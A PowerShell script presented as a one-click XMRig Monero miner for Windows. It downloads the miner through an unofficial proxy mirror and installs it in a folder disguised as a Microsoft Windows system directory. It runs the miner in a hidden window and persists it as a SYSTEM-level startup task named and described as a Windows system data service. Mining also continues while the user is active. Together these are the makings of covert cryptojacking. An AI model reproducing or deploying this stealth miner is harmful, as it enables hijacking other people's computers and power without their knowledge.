# XMRig One-Click Mining Script for Windows PowerShell
# Monero One-Click Mining Script - Windows PowerShell Version
# Author: XMRig Mining Team
# Version: 2.0
# Support: Windows 10/11, PowerShell 5.1+

param(
    [Parameter(Mandatory=$false, Position=0)]
    [string]$WalletAddress,
    
    [Parameter(Mandatory=$false, Position=1)]
    [string]$PoolAddress,
    
    [Parameter(Mandatory=$false, Position=2)]
    [int]$CpuUsage = 80,
    
    [Parameter(Mandatory=$false)]
    [string]$WorkerName = $env:COMPUTERNAME,
    
    [Parameter(Mandatory=$false)]
    [switch]$Help,
    
    [Parameter(Mandatory=$false)]
    [switch]$Stop,
    
    [Parameter(Mandatory=$false)]
    [switch]$Status,
    
    [Parameter(Mandatory=$false)]
    [switch]$Restart
)

# Script Configuration
$SCRIPT_VERSION = "2.0"
$XMRIG_VERSION = "6.22.3"
$XMRIG_DIR = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\SystemData"
$CONFIG_FILE = "$XMRIG_DIR\config.json"
$LOG_FILE = "$XMRIG_DIR\miner.log"
$PID_FILE = "$XMRIG_DIR\miner.pid"
$SERVICE_NAME = "WindowsSystemDataService"

# Color output function
function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

# Create auto-start service
function Create-AutoStartService {
    try {
        # Create startup script
        $startupScript = @"
@echo off
cd /d "$XMRIG_DIR"
start /min "" "xmrig.exe" --config="$CONFIG_FILE"
"@
        
        $startupScriptPath = "$XMRIG_DIR\startup.bat"
        [System.IO.File]::WriteAllText($startupScriptPath, $startupScript, [System.Text.UTF8Encoding]::new($false))
        
        # Create scheduled task for auto-start
        $taskName = $SERVICE_NAME
        $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        
        if ($taskExists) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        }
        
        # Create task action
        $action = New-ScheduledTaskAction -Execute $startupScriptPath
        
        # Create task trigger (at startup)
        $trigger = New-ScheduledTaskTrigger -AtStartup
        
        # Create task settings
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
        
        # Create task principal (run as SYSTEM)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        # Register the task
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Windows System Data Service" -ErrorAction SilentlyContinue | Out-Null
        
        Write-ColorOutput "Auto-start service created successfully" "Green"
        return $true
    } catch {
        Write-ColorOutput "Failed to create auto-start service: $($_.Exception.Message)" "Yellow"
        return $false
    }
}


# Show banner
function Show-Banner {
    Clear-Host
    Write-ColorOutput "================================================================" "Cyan"
    Write-ColorOutput "                    XMRig One-Click Mining Script               " "Cyan"
    Write-ColorOutput "                   Windows PowerShell Version                   " "Cyan"
    Write-ColorOutput "                        Version $SCRIPT_VERSION                           " "Cyan"
    Write-ColorOutput "================================================================" "Cyan"
    Write-ColorOutput "  Zero Fee | Auto Config | Performance Optimized | Real-time Monitor" "Yellow"
    Write-ColorOutput "================================================================" "Cyan"
    Write-Host ""
}

# Show help information
function Show-Help {
    Show-Banner
    Write-ColorOutput "Usage Guide:" "Green"
    Write-Host ""
    Write-ColorOutput "Basic Usage:" "Yellow"
    Write-Host "  .\miner_windows.ps1 <wallet_address> <pool_address:port> [cpu_usage]"
    Write-Host ""
    Write-ColorOutput "Parameters:" "Yellow"
    Write-Host "  wallet_address   - Your Monero wallet address"
    Write-Host "  pool_address:port - Mining pool server address and port"
    Write-Host "  cpu_usage        - CPU usage percentage (default: 80%)"
    Write-Host "  -WorkerName      - Worker name (default: computer name)"
    Write-Host ""
    Write-ColorOutput "Management Commands:" "Yellow"
    Write-Host "  -Help        - Show this help information"
    Write-Host "  -Stop        - Stop mining"
    Write-Host "  -Status      - Check mining status"
    Write-Host "  -Restart     - Restart mining"
    Write-Host ""
    Write-ColorOutput "Examples:" "Green"
    Write-Host "  .\miner_windows.ps1 4xxxxxxx pool.supportxmr.com:443 70"
    Write-Host "  .\miner_windows.ps1 -Stop"
    Write-Host "  .\miner_windows.ps1 -Status"
    Write-Host ""
    Write-ColorOutput "Popular Mining Pools:" "Cyan"
    Write-Host "  SupportXMR:  pool.supportxmr.com:443 (SSL)"
    Write-Host "  MineXMR:     pool.minexmr.com:4444"
    Write-Host "  NanoPool:    xmr-us-east1.nanopool.org:14444"
    Write-Host ""
}

# Check system requirements
function Test-SystemRequirements {
    Write-ColorOutput "Checking system requirements..." "Yellow"
    
    # Check PowerShell version
    if ($PSVersionTable.PSVersion.Major -lt 5) {
        Write-ColorOutput "ERROR: PowerShell 5.1 or higher is required" "Red"
        exit 1
    }
    
    # Check operating system
    $osVersion = [System.Environment]::OSVersion.Version
    if ($osVersion.Major -lt 10) {
        Write-ColorOutput "WARNING: Windows 10 or higher is recommended for best performance" "Yellow"
    }
    
    # Check .NET Framework
    try {
        $netVersion = Get-ItemProperty "HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\" -Name Release -ErrorAction Stop
        if ($netVersion.Release -lt 461808) {
            Write-ColorOutput "WARNING: .NET Framework 4.7.2 or higher is recommended" "Yellow"
        }
    } catch {
        Write-ColorOutput "WARNING: Unable to detect .NET Framework version" "Yellow"
    }
    
    Write-ColorOutput "System check completed" "Green"
}

# Get CPU information
function Get-CpuInfo {
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
    $cores = $cpu.NumberOfCores
    $threads = $cpu.NumberOfLogicalProcessors
    
    return @{
        Name = $cpu.Name
        Cores = $cores
        Threads = $threads
    }
}

# Download file
function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    
    try {
        Write-ColorOutput "Downloading: $Url" "Yellow"
        
        # Use Invoke-WebRequest to download
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
        
        Write-ColorOutput "Download completed: $OutputPath" "Green"
        return $true
    } catch {
        Write-ColorOutput "Download failed: $($_.Exception.Message)" "Red"
        return $false
    }
}

# Extract archive
function Extract-Archive {
    param(
        [string]$ArchivePath,
        [string]$DestinationPath
    )
    
    try {
        Write-ColorOutput "Extracting: $ArchivePath" "Yellow"
        
        # Create destination directory
        if (!(Test-Path $DestinationPath)) {
            New-Item -ItemType Directory -Path $DestinationPath -Force | Out-Null
        }
        
        # Extract files
        Expand-Archive -Path $ArchivePath -DestinationPath $DestinationPath -Force
        
        Write-ColorOutput "Extraction completed" "Green"
        return $true
    } catch {
        Write-ColorOutput "Extraction failed: $($_.Exception.Message)" "Red"
        return $false
    }
}

# Install XMRig
function Install-XMRig {
    Write-ColorOutput "Installing XMRig $XMRIG_VERSION..." "Yellow"
    
    # Create XMRig directory
    if (!(Test-Path $XMRIG_DIR)) {
        New-Item -ItemType Directory -Path $XMRIG_DIR -Force | Out-Null
    }
    
    # Check if already installed
    $xmrigExe = "$XMRIG_DIR\xmrig.exe"
    if (Test-Path $xmrigExe) {
        Write-ColorOutput "XMRig is already installed" "Green"
        return $true
    }
    
    # Determine download URL
    $architecture = if ([Environment]::Is64BitOperatingSystem) { "win64" } else { "win32" }
    $downloadUrl = "https://gh.llkk.cc/https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-msvc-$architecture.zip"
    $zipFile = "$XMRIG_DIR\xmrig.zip"
    
    # Download XMRig
    if (!(Download-File -Url $downloadUrl -OutputPath $zipFile)) {
        Write-ColorOutput "XMRig download failed" "Red"
        return $false
    }
    
    # Extract XMRig
    if (!(Extract-Archive -ArchivePath $zipFile -DestinationPath $XMRIG_DIR)) {
        Write-ColorOutput "XMRig extraction failed" "Red"
        return $false
    }
    
    # Move files to correct location
    $extractedDir = Get-ChildItem -Path $XMRIG_DIR -Directory | Where-Object { $_.Name -like "xmrig-*" } | Select-Object -First 1
    if ($extractedDir) {
        Get-ChildItem -Path $extractedDir.FullName | Move-Item -Destination $XMRIG_DIR -Force
        Remove-Item -Path $extractedDir.FullName -Recurse -Force
    }
    
    # Clean up download file
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
    
    # Verify installation
    if (Test-Path $xmrigExe) {
        Write-ColorOutput "XMRig installation successful" "Green"
        return $true
    } else {
        Write-ColorOutput "XMRig installation failed" "Red"
        return $false
    }
}

# Generate configuration file
function New-XMRigConfig {
    param(
        [string]$WalletAddress,
        [string]$PoolAddress,
        [int]$CpuUsage,
        [string]$WorkerName
    )
    
    Write-ColorOutput "Generating configuration file..." "Yellow"
    
    # Get CPU information
    $cpuInfo = Get-CpuInfo
    $maxThreads = [Math]::Floor($cpuInfo.Threads * ($CpuUsage / 100.0))
    if ($maxThreads -lt 1) { $maxThreads = 1 }
    
    # Parse pool address
    $poolParts = $PoolAddress -split ":"
    $poolHost = $poolParts[0]
    $poolPort = if ($poolParts.Length -gt 1) { [int]$poolParts[1] } else { 4444 }
    
    # Detect SSL usage
    $useTls = $poolPort -eq 443 -or $poolPort -eq 5555 -or $PoolAddress -match "ssl|tls"
    
    # Generate configuration
    $config = @{
        "api" = @{
            "id" = $null
            "worker-id" = $WorkerName
        }
        "http" = @{
            "enabled" = $false
            "host" = "127.0.0.1"
            "port" = 0
            "access-token" = $null
            "restricted" = $true
        }
        "autosave" = $true
        "background" = $false
        "colors" = $true
        "title" = $true
        "randomx" = @{
            "init" = -1
            "init-avx2" = -1
            "mode" = "auto"
            "1gb-pages" = $false
            "rdmsr" = $true
            "wrmsr" = $true
            "cache_qos" = $false
            "numa" = $true
            "scratchpad_prefetch_mode" = 1
        }
        "cpu" = @{
            "enabled" = $true
            "huge-pages" = $true
            "huge-pages-jit" = $false
            "hw-aes" = $null
            "priority" = $null
            "memory-pool" = $false
            "yield" = $true
            "max-threads-hint" = $maxThreads
            "asm" = $true
            "argon2-impl" = $null
            "cn/0" = $false
            "cn-lite/0" = $false
        }
        "opencl" = @{
            "enabled" = $false
            "cache" = $true
            "loader" = $null
            "platform" = "AMD"
            "adl" = $true
            "cn/0" = $false
            "cn-lite/0" = $false
        }
        "cuda" = @{
            "enabled" = $false
            "loader" = $null
            "nvml" = $true
            "cn/0" = $false
            "cn-lite/0" = $false
        }
        "donate-level" = 0
        "donate-over-proxy" = 0
        "log-file" = $LOG_FILE
        "pools" = @(
            @{
                "algo" = $null
                "coin" = "monero"
                "url" = "$poolHost`:$poolPort"
                "user" = "$WalletAddress.$WorkerName"
                "pass" = "x"
                "rig-id" = $null
                "nicehash" = $false
                "keepalive" = $true
                "enabled" = $true
                "tls" = $useTls
                "tls-fingerprint" = $null
                "daemon" = $false
                "socks5" = $null
                "self-select" = $null
                "submit-to-origin" = $false
            }
        )
        "print-time" = 60
        "health-print-time" = 60
        "dmi" = $true
        "retries" = 5
        "retry-pause" = 5
        "syslog" = $false
        "tls" = @{
            "enabled" = $false
            "protocols" = $null
            "cert" = $null
            "cert_key" = $null
            "ciphers" = $null
            "ciphersuites" = $null
            "dhparam" = $null
        }
        "dns" = @{
            "ipv6" = $false
            "ttl" = 30
        }
        "user-agent" = $null
        "verbose" = 0
        "watch" = $true
        "pause-on-battery" = $false
        "pause-on-active" = $false
    }
    
    # Save configuration file
    try {
        $jsonContent = $config | ConvertTo-Json -Depth 10
        [System.IO.File]::WriteAllText($CONFIG_FILE, $jsonContent, [System.Text.UTF8Encoding]::new($false))
        Write-ColorOutput "Configuration file generated: $CONFIG_FILE" "Green"
        return $true
    } catch {
        Write-ColorOutput "Configuration file generation failed: $($_.Exception.Message)" "Red"
        return $false
    }
}

# Start mining
function Start-Mining {
    Write-ColorOutput "Starting mining..." "Yellow"
    
    $xmrigExe = "$XMRIG_DIR\xmrig.exe"
    
    # Check if XMRig exists
    if (!(Test-Path $xmrigExe)) {
        Write-ColorOutput "XMRig not found, please install first" "Red"
        return $false
    }
    
    # Check configuration file
    if (!(Test-Path $CONFIG_FILE)) {
        Write-ColorOutput "Configuration file not found" "Red"
        return $false
    }

    try {
        # Create Windows service for auto-start
        Create-AutoStartService
        
        # Start XMRig process
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $xmrigExe
        $processInfo.Arguments = "--config=`"$CONFIG_FILE`""
        $processInfo.WorkingDirectory = $XMRIG_DIR
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        # Save process ID
        $process.Id | Set-Content -Path $PID_FILE
        
        Write-ColorOutput "Mining started successfully (PID: $($process.Id))" "Green"
        Write-ColorOutput "Log file: $LOG_FILE" "Cyan"
        Write-ColorOutput "Config file: $CONFIG_FILE" "Cyan"
        
        return $true
    } catch {
        Write-ColorOutput "Failed to start mining: $($_.Exception.Message)" "Red"
        return $false
    }
}

# Stop mining
function Stop-Mining {
    Write-ColorOutput "Stopping mining..." "Yellow"
    
    $stopped = $false
    
    # Read process ID from PID file
    if (Test-Path $PID_FILE) {
        try {
            $pid = Get-Content -Path $PID_FILE -ErrorAction Stop
            $process = Get-Process -Id $pid -ErrorAction Stop
            
            if ($process.ProcessName -eq "xmrig") {
                $process.Kill()
                $process.WaitForExit(5000)
                Write-ColorOutput "Mining process stopped (PID: $pid)" "Green"
                $stopped = $true
            }
        } catch {
            # Process in PID file doesn't exist or already stopped
        }
        
        # Remove PID file
        Remove-Item -Path $PID_FILE -Force -ErrorAction SilentlyContinue
    }
    
    # Find and stop all xmrig processes
    $xmrigProcesses = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    foreach ($process in $xmrigProcesses) {
        try {
            $process.Kill()
            Write-ColorOutput "Stopped XMRig process (PID: $($process.Id))" "Green"
            $stopped = $true
        } catch {
            Write-ColorOutput "Unable to stop process PID: $($process.Id)" "Yellow"
        }
    }
    
    if (!$stopped) {
        Write-ColorOutput "No running mining processes found" "Cyan"
    }
    
    return $stopped
}

# Get mining status
function Get-MiningStatus {
    Write-ColorOutput "Checking mining status..." "Yellow"
    Write-Host ""
    
    # Check process status
    $xmrigProcesses = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    
    if ($xmrigProcesses) {
        Write-ColorOutput "Mining Status: Running" "Green"
        Write-Host ""
        
        foreach ($process in $xmrigProcesses) {
            Write-ColorOutput "Process Information:" "Cyan"
            Write-Host "  PID: $($process.Id)"
            Write-Host "  CPU Usage: $($process.CPU)%"
            Write-Host "  Memory Usage: $([Math]::Round($process.WorkingSet64/1MB, 2)) MB"
            Write-Host "  Start Time: $($process.StartTime)"
            Write-Host ""
        }
        
        # Show last few lines of log file
        if (Test-Path $LOG_FILE) {
            Write-ColorOutput "Recent Logs (last 10 lines):" "Cyan"
            Get-Content -Path $LOG_FILE -Tail 10 | ForEach-Object {
                Write-Host "  $_" -ForegroundColor Gray
            }
        }
    } else {
        Write-ColorOutput "Mining Status: Not Running" "Red"
        
        # Check PID file
        if (Test-Path $PID_FILE) {
            Write-ColorOutput "Found residual PID file, cleaning up..." "Yellow"
            Remove-Item -Path $PID_FILE -Force
        }
    }
    
    Write-Host ""
    Write-ColorOutput "File Locations:" "Cyan"
    Write-Host "  XMRig Directory: $XMRIG_DIR"
    Write-Host "  Config File: $CONFIG_FILE"
    Write-Host "  Log File: $LOG_FILE"
}

# Restart mining
function Restart-Mining {
    Write-ColorOutput "Restarting mining..." "Yellow"
    
    # Stop mining
    Stop-Mining | Out-Null
    Start-Sleep -Seconds 2
    
    # Start mining
    if (Test-Path $CONFIG_FILE) {
        Start-Mining
    } else {
        Write-ColorOutput "Configuration file does not exist, cannot restart. Please run the script again to configure." "Red"
        return $false
    }
}

# Main function
function Main {
    # Show banner
    Show-Banner
    
    # Handle command line parameters
    if ($Help) {
        Show-Help
        return
    }
    
    if ($Stop) {
        Stop-Mining
        return
    }
    
    if ($Status) {
        Get-MiningStatus
        return
    }
    
    if ($Restart) {
        Restart-Mining
        return
    }
    
    # Validate required parameters
    if (!$WalletAddress -or !$PoolAddress) {
        Write-ColorOutput "Missing required parameters" "Red"
        Write-Host ""
        Write-ColorOutput "Use -Help to see detailed instructions" "Yellow"
        return
    }
    
    # Validate wallet address format
    if ($WalletAddress.Length -lt 95 -or $WalletAddress.Length -gt 106 -or !($WalletAddress -match "^[48][0-9A-Za-z]+$")) {
        Write-ColorOutput "Incorrect wallet address format" "Red"
        Write-ColorOutput "Monero wallet address should be 95-106 characters long and start with '4' or '8'" "Yellow"
        return
    }
    
    # Validate CPU usage
    if ($CpuUsage -lt 1 -or $CpuUsage -gt 100) {
        Write-ColorOutput "CPU usage must be between 1-100" "Red"
        return
    }
    
    # Show configuration information
    Write-ColorOutput "Mining Configuration:" "Cyan"
    Write-Host "  Wallet Address: $($WalletAddress.Substring(0,8))...$($WalletAddress.Substring($WalletAddress.Length-8))"
    Write-Host "  Pool Address: $PoolAddress"
    Write-Host "  CPU Usage: $CpuUsage%"
    Write-Host "  Worker Name: $WorkerName"
    Write-Host ""
    
    # Check system requirements
    Test-SystemRequirements
    Write-Host ""
    
    # Show CPU information
    $cpuInfo = Get-CpuInfo
    Write-ColorOutput "CPU Information:" "Cyan"
    Write-Host "  Model: $($cpuInfo.Name)"
    Write-Host "  Cores: $($cpuInfo.Cores)"
    Write-Host "  Threads: $($cpuInfo.Threads)"
    Write-Host ""
    
    # Stop existing mining processes
    $existingProcesses = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($existingProcesses) {
        Write-ColorOutput "Found running mining processes, stopping..." "Yellow"
        Stop-Mining | Out-Null
        Start-Sleep -Seconds 2
    }
    
    # Install XMRig
    if (!(Install-XMRig)) {
        Write-ColorOutput "XMRig installation failed" "Red"
        return
    }
    
    # Generate configuration file
    if (!(New-XMRigConfig -WalletAddress $WalletAddress -PoolAddress $PoolAddress -CpuUsage $CpuUsage -WorkerName $WorkerName)) {
        Write-ColorOutput "Configuration generation failed" "Red"
        return
    }
    
    # Start mining
    if (Start-Mining) {
        Write-Host ""
        Write-ColorOutput "Mining started successfully!" "Green"
        
        # Create auto-start service
        Write-Host ""
        Write-ColorOutput "Setting up auto-start service..." "Cyan"
        Create-AutoStartService | Out-Null
        
        Write-Host ""
        Write-ColorOutput "Management Commands:" "Cyan"
        Write-Host "  Check Status: .\miner_windows.ps1 -Status"
        Write-Host "  Stop Mining: .\miner_windows.ps1 -Stop"
        Write-Host "  Restart Mining: .\miner_windows.ps1 -Restart"
        Write-Host ""
        Write-ColorOutput "Happy Mining!" "Yellow"
    } else {
        Write-ColorOutput "Mining startup failed" "Red"
    }
}

# Execute main function
Main
